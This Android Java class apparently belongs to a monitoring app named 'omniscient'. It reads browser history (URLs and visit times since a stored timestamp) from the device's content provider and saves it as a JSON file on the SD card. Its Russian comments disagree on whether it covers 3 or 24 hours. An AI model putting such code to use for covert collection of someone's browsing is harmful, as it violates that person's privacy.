package com.postal.omniscient.postal.reader.browser_history;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import com.postal.omniscient.postal.SPreferences.PreferencesGetSet;
import com.postal.omniscient.postal.adapter.AdapterData;
import com.postal.omniscient.postal.write.json.WriteToJsonFile;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

/**
 * Класс получающий историю браузера за последнее 3 часа
 * Created by Александр on 05.05.2016.
 */
public class BrowserHistory {
    private Context context;
    private ContentResolver contentResolver;
    private static String fileName = "browser.json";
    private static String folder = "Browser";
    private static String id ="_id";
    private static String url_data = "url";
    private static String date = "date";
    private static String DATE_COLUMN_NAME = date+" > ? AND ?";//выборка по дате с колонки date с ? по ? число

    public BrowserHistory(Context context, ContentResolver contentResolver) {
       this.contentResolver = contentResolver;
        this.context = context;
    }
    /**
     * Получаем сторию браузера за последнее 24 часа
     * AdapterData c полями: Id, Address (url), Time (date)
     */
    public List<AdapterData> getBrowserHist()  {
        Uri uri;
        AdapterData browser_ob;
        List<AdapterData> listOfAllImages = null;
        try {
            PreferencesGetSet Sp = new PreferencesGetSet();
            listOfAllImages = new ArrayList<AdapterData>();
            Calendar currentDate = Calendar.getInstance();
            Long end_date = currentDate.getTimeInMillis();
            Long start_date = Sp.readeFromPreferences(context)-1;
            String[] date_query = {start_date.toString(), end_date.toString()};


            uri = Uri.parse("content://browser/bookmarks");
            String[] projection = {id, url_data, date};


            Cursor cur = contentResolver.query(uri,
                    projection, DATE_COLUMN_NAME, date_query, date + " DESC");// DESC - сортировка по убываню

            int id_column_index, url_data_column_index, date_column_index;
            id_column_index = cur.getColumnIndexOrThrow(id);
            url_data_column_index = cur.getColumnIndexOrThrow(url_data);
            date_column_index = cur.getColumnIndexOrThrow(date);

            long buf_date;
            while (cur.moveToNext()) {
                browser_ob = new AdapterData();
                browser_ob.setId(cur.getString(id_column_index));//id
                browser_ob.setAddress(cur.getString(url_data_column_index));//url на которые заходил последних 3 часа
                buf_date = Long.parseLong(cur.getString(date_column_index));
                browser_ob.setTime(//date когда заходили на страницу в интернент
                        new SimpleDateFormat("yyyy_MM_dd_HH-mm-ss")
                                .format(buf_date));

                listOfAllImages.add(browser_ob);

            }
            cur.close();
        }catch (Exception e){Log.i("MyMsg", "Error BrowserHistory getBrowserHist "+e);}
        return listOfAllImages;
    }
    //пишем историю браузера в json файл
    public void historyToJson(){
        WriteToJsonFile writeToFile = new WriteToJsonFile(context);
        JSONObject history = new JSONObject();//Заголовок
        JSONObject url_and_time;//url и время посещений
        JSONArray mass = new JSONArray();//массив куда записуем url & time
        try {
            for (AdapterData date : getBrowserHist()) {
                url_and_time = new JSONObject();
                try {
                    url_and_time.put("Url", date.getAddress());
                    url_and_time.put("Time", date.getTime());
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                mass.put(url_and_time);
            }
            try {
                history.put("History", mass);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            writeToFile.writeFileSD(history, fileName, folder);
        }catch (Exception e){Log.i("MyMsg", "Error BrowserHistory historyToJson "+e);}
    }
}
